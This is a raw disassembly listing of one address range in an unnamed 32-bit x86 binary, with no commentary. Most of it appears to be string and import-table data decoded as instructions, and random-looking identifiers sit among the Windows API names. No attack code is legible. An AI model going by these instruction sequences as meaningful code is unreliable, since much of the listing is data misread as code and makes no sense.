  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	jmp    0x6832cf58
  413f67:	xlat   BYTE PTR ds:[ebx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	ss gs mov al,0x3d
  413f72:	push   ss
  413f73:	lea    esp,[ecx-0x2c]
  413f76:	repnz aad 0xc2
  413f79:	mov    ah,0x38
  413f7b:	and    al,0xc6
